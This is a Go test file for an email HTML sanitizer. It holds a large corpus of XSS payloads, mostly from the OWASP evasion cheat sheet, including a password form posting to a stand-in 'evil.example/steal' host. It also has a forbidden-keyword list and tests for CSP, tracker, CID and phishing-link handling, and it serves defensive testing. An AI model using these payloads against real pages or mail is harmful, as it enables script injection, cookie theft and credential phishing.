// SPDX-License-Identifier: AGPL-3.0-or-later

package sanitize

import (
	"strings"
	"testing"
)

// xssVectors is a selection of the OWASP XSS Filter Evasion Cheat Sheet plus
// mail-specific vectors.
var xssVectors = []string{
	`<script>alert('XSS')</script>`,
	`<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>`,
	`<IMG SRC="javascript:alert('XSS');">`,
	`<IMG SRC=javascript:alert('XSS')>`,
	`<IMG SRC=JaVaScRiPt:alert('XSS')>`,
	"<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
	`<a onmouseover="alert(document.cookie)">xxs link</a>`,
	`<a onmouseover=alert(document.cookie)>xxs link</a>`,
	`<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>`,
	`<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`,
	`<IMG SRC=# onmouseover="alert('xxs')">`,
	`<IMG SRC= onmouseover="alert('xxs')">`,
	`<IMG onmouseover="alert('xxs')">`,
	`<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
	`<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`,
	`<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
	`<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
	`<IMG SRC="jav	ascript:alert('XSS');">`,
	`<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
	`<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
	`<IMG SRC=" &#14;  javascript:alert('XSS');">`,
	`<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`,
	`<BODY onload!#$%&()*~+-_.,:;?@[/|\]^` + "`" + `=alert("XSS")>`,
	`<<SCRIPT>alert("XSS");//\<</SCRIPT>`,
	`<SCRIPT SRC=http://xss.rocks/xss.js?< B >`,
	`<IMG SRC="` + "`" + `<javascript:alert>` + "`" + `('XSS')"`,
	`<iframe src=http://xss.rocks/scriptlet.html <`,
	`</TITLE><SCRIPT>alert("XSS");</SCRIPT>`,
	`<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`,
	`<BODY BACKGROUND="javascript:alert('XSS')">`,
	`<IMG DYNSRC="javascript:alert('XSS')">`,
	`<IMG LOWSRC="javascript:alert('XSS')">`,
	`<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`,
	`<svg/onload=alert('XSS')>`,
	`<svg><script>alert(1)</script></svg>`,
	`<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
	`<BODY ONLOAD=alert('XSS')>`,
	`<BGSOUND SRC="javascript:alert('XSS');">`,
	`<BR SIZE="&{alert('XSS')}">`,
	`<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
	`<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">`,
	`<STYLE>@import'http://xss.rocks/xss.css';</STYLE>`,
	`<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">`,
	`<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`,
	`<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
	`<STYLE TYPE="text/javascript">alert('XSS');</STYLE>`,
	`<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>`,
	`<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>`,
	`<XSS STYLE="xss:expression(alert('XSS'))">`,
	`<XSS STYLE="behavior: url(xss.htc);">`,
	`<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
	`<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
	`<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`,
	`<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`,
	`<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
	`<TABLE BACKGROUND="javascript:alert('XSS')">`,
	`<TABLE><TD BACKGROUND="javascript:alert('XSS')">`,
	`<DIV STYLE="background-image: url(javascript:alert('XSS'))">`,
	`<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">`,
	`<DIV STYLE="width: expression(alert('XSS'));">`,
	`<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->`,
	`<BASE HREF="javascript:alert('XSS');//">`,
	`<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>`,
	`<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`,
	`<a href="javascript:alert(1)">click</a>`,
	`<a href="JaVaScRiPt:alert(1)">click</a>`,
	`<a href="&#106;avascript:alert(1)">click</a>`,
	`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>`,
	`<a href="vbscript:msgbox(1)">click</a>`,
	`<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`,
	`<form action="https://evil.example/steal"><input name="pw" type="password"><button>Login</button></form>`,
	`<div style="position:fixed;top:0;left:0;width:100%;height:100%">overlay</div>`,
	`<details open ontoggle=alert(1)>`,
	`<video><source onerror="alert(1)">`,
	`<audio src=x onerror=alert(1)>`,
	`<marquee onstart=alert(1)>`,
	`<style>*{background:url('//evil.example/x')}</style>`,
	`<style></style><img src=x onerror=alert(1)></style>`,
	`<style>a{color:red}</style><style>p{x:1}</style></style><script>alert(1)</script>`,
	`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
	`<template><script>alert(1)</script></template>`,
	`<object data="javascript:alert(1)">`,
	`<isindex type=image src=1 onerror=alert(1)>`,
	`<img src="x" style="background:url(&quot;javascript:alert(1)&quot;)">`,
}

var forbidden = []string{
	"<script", "javascript:", "vbscript:", "onerror", "onload", "onmouseover", "ontoggle", "onstart",
	"expression(", "<iframe", "<object", "<embed", "<form", "<input", "<button", "<svg", "<math",
	"<frame", "<base", "<meta http-equiv=\"refresh", "-moz-binding", "behavior:", "position:fixed",
	"position: fixed", "@import", "data:text/html", "data:image/svg", "<link", "xss.rocks", "evil.example",
}

func TestXSSCorpus(t *testing.T) {
	s := New(Config{})
	for _, v := range xssVectors {
		for _, frag := range []bool{false, true} {
			for _, remote := range []bool{false, true} {
				res := s.Sanitize(v, Options{MessageID: "1", Fragment: frag, AllowRemote: remote})
				body := res.HTML
				if !frag {
					// The CSP meta legitimately mentions some keywords.
					if i := strings.Index(body, "<body>"); i >= 0 {
						body = body[i:]
					}
				}
				low := strings.ToLower(body)
				for _, f := range forbidden {
					if remote && (f == "xss.rocks" || f == "evil.example") {
						continue // allowed remote images may point anywhere
					}
					if strings.Contains(low, f) {
						t.Errorf("vector %q (fragment=%v remote=%v): output contains %q:\n%s", v, frag, remote, f, body)
					}
				}
			}
		}
	}
}

func TestDocumentWrapperHasCSP(t *testing.T) {
	res := Sanitize(`<p>Hello</p>`, Options{})
	if !strings.Contains(res.HTML, `http-equiv="Content-Security-Policy"`) || !strings.Contains(res.HTML, "default-src &#39;none&#39;") {
		t.Fatalf("missing CSP: %s", res.HTML)
	}
	if !strings.Contains(res.HTML, "<p>Hello</p>") {
		t.Fatalf("content lost: %s", res.HTML)
	}
}

func TestRemoteImagesBlocked(t *testing.T) {
	src := `<p>Hi</p><img src="https://cdn.example.com/logo.png" width="200" height="50" alt="Logo">
<div style="background-image:url('http://cdn.example.com/bg.jpg'); color: red">x</div>
<table background="https://cdn.example.com/t.gif"><tr><td>y</td></tr></table>`
	res := Sanitize(src, Options{Fragment: true})
	if res.BlockedRemote != 3 || !res.HasRemote {
		t.Fatalf("blocked=%d hasRemote=%v\n%s", res.BlockedRemote, res.HasRemote, res.HTML)
	}
	if strings.Contains(res.HTML, ` src="https://cdn.example.com`) {
		t.Fatalf("remote src kept: %s", res.HTML)
	}
	if !strings.Contains(res.HTML, `data-remote-src="https://cdn.example.com/logo.png"`) || !strings.Contains(res.HTML, PlaceholderImage) {
		t.Fatalf("placeholder missing: %s", res.HTML)
	}
	if !strings.Contains(res.HTML, "color: red") {
		t.Fatalf("safe style lost: %s", res.HTML)
	}
	if len(res.Trackers) != 0 {
		t.Fatalf("unexpected trackers %v", res.Trackers)
	}
}

func TestRemoteAllowedAndProxy(t *testing.T) {
	src := `<img src="https://cdn.example.com/logo.png" width="200" height="50">`
	res := Sanitize(src, Options{AllowRemote: true, Fragment: true})
	if res.BlockedRemote != 0 || !strings.Contains(res.HTML, `src="https://cdn.example.com/logo.png"`) {
		t.Fatalf("allowed remote: %+v", res)
	}
	s := New(Config{ProxyURLTemplate: "/api/proxy?url={url}"})
	res = s.Sanitize(src, Options{AllowRemote: true, Fragment: true})
	if !strings.Contains(res.HTML, `src="/api/proxy?url=https%3A%2F%2Fcdn.example.com%2Flogo.png"`) {
		t.Fatalf("proxy: %s", res.HTML)
	}
	full := s.Sanitize(src, Options{AllowRemote: true})
	if !strings.Contains(full.HTML, "img-src &#39;self&#39; data: https: http:") {
		t.Fatalf("csp with remote: %s", full.HTML)
	}
}

func TestTrackingPixels(t *testing.T) {
	src := `<img src="https://news.example.com/open/abc.gif" width="1" height="1">
<img src="https://foo.list-manage.com/track/open.php?u=1">
<img src="https://mailtrack.io/trace/mail/123.png">
<img src="https://img.example.org/a.png" style="display:none">
<img src="https://img.example.org/hero.jpg" width="600" height="300">`
	res := Sanitize(src, Options{AllowRemote: true, Fragment: true})
	want := []string{"foo.list-manage.com", "img.example.org", "mailtrack.io", "news.example.com"}
	if strings.Join(res.Trackers, ",") != strings.Join(want, ",") {
		t.Fatalf("trackers = %v, want %v", res.Trackers, want)
	}
	if res.BlockedRemote != 4 {
		t.Fatalf("blocked = %d", res.BlockedRemote)
	}
	if !strings.Contains(res.HTML, `src="https://img.example.org/hero.jpg"`) {
		t.Fatalf("normal image dropped: %s", res.HTML)
	}
}

func TestCIDRewrite(t *testing.T) {
	src := `<img src="cid:image001.png@01D9" alt="x"><div style="background:url(cid:bg@x)">a</div>`
	res := Sanitize(src, Options{MessageID: "42", Fragment: true})
	if !strings.Contains(res.HTML, `src="/api/messages/42/cid/image001.png@01D9"`) {
		t.Fatalf("cid img: %s", res.HTML)
	}
	if !strings.Contains(res.HTML, `url(&#34;/api/messages/42/cid/bg@x&#34;)`) && !strings.Contains(res.HTML, `/api/messages/42/cid/bg@x`) {
		t.Fatalf("cid css: %s", res.HTML)
	}
	if strings.Join(res.CIDs, ",") != "bg@x,image001.png@01D9" {
		t.Fatalf("cids %v", res.CIDs)
	}
	if res.BlockedRemote != 0 {
		t.Fatalf("cid counted as remote")
	}
}

func TestLinks(t *testing.T) {
	src := `<a href="https://example.com/x">Example</a> <a href="https://evil.example.net/login">www.paypal.com</a>
<a href="https://www.paypal.com/de/signin">https://paypal.com</a> <a href="http://192.168.1.1/x">bank.de</a>
<a href="https://paypal.com@evil.example.net/">PayPal</a> <a href="/api/logout">relative</a> <a href="https://example.com/doc">invoice.pdf</a>`
	res := Sanitize(src, Options{Fragment: true})
	if !strings.Contains(res.HTML, `rel="noopener noreferrer"`) && !strings.Contains(res.HTML, `rel="noreferrer noopener"`) {
		t.Fatalf("rel missing: %s", res.HTML)
	}
	if !strings.Contains(res.HTML, `target="_blank"`) {
		t.Fatalf("target missing: %s", res.HTML)
	}
	if strings.Contains(res.HTML, "/api/logout") {
		t.Fatalf("relative link kept: %s", res.HTML)
	}
	if len(res.PhishingLinks) != 3 {
		t.Fatalf("phishing = %+v", res.PhishingLinks)
	}
	got := map[string]string{}
	for _, p := range res.PhishingLinks {
		got[p.Text] = p.Reason
	}
	if got["www.paypal.com"] != "domain_mismatch" || got["bank.de"] != "ip_address" || got["PayPal"] != "userinfo" {
		t.Fatalf("reasons %v", got)
	}
}

func TestStyleSheet(t *testing.T) {
	src := `<html><head><style>
@import url(https://evil.example/x.css);
@font-face { font-family: X; src: url(https://fonts.example/x.woff) }
body { color: #333; position: fixed; background: url(https://img.example/bg.png) }
.a { width: expression(alert(1)); margin: 0 }
@media only screen and (max-width: 600px) { .b { width: 100% !important } }
</style></head><body><p class="a">x</p></body></html>`
	res := Sanitize(src, Options{})
	if !strings.Contains(res.HTML, "color: #333") || !strings.Contains(res.HTML, "margin: 0") {
		t.Fatalf("safe css lost: %s", res.HTML)
	}
	if !strings.Contains(res.HTML, "@media only screen and (max-width: 600px)") || !strings.Contains(res.HTML, "width: 100% !important") {
		t.Fatalf("media lost: %s", res.HTML)
	}
	for _, bad := range []string{"@import", "font-face", "position", "expression", "img.example", "evil.example"} {
		if strings.Contains(res.HTML[strings.Index(res.HTML, "<style>"):], bad) {
			t.Fatalf("%q kept: %s", bad, res.HTML)
		}
	}
	if res.BlockedRemote < 2 {
		t.Fatalf("blocked = %d", res.BlockedRemote)
	}
}

func TestToText(t *testing.T) {
	src := `<html><head><style>p{}</style><title>T</title></head><body>
<p>Hello <b>World</b>,</p><p>see <a href="https://example.com">our site</a> and https://x.org</p>
<ul><li>one</li><li>two</li></ul><ol><li>first</li></ol>
<blockquote><p>quoted</p><p>more</p></blockquote>
<p>line1<br>line2</p><table><tr><td>a</td><td>b</td></tr></table><img alt="logo"></body></html>`
	got := ToText(src)
	want := "Hello World,\n\nsee our site <https://example.com> and https://x.org\n\n- one\n- two\n\n1. first\n\n> quoted\n>\n> more\n\nline1\nline2\n\na\tb\n\nlogo"
	if got != want {
		t.Fatalf("ToText:\n%q\nwant\n%q", got, want)
	}
}
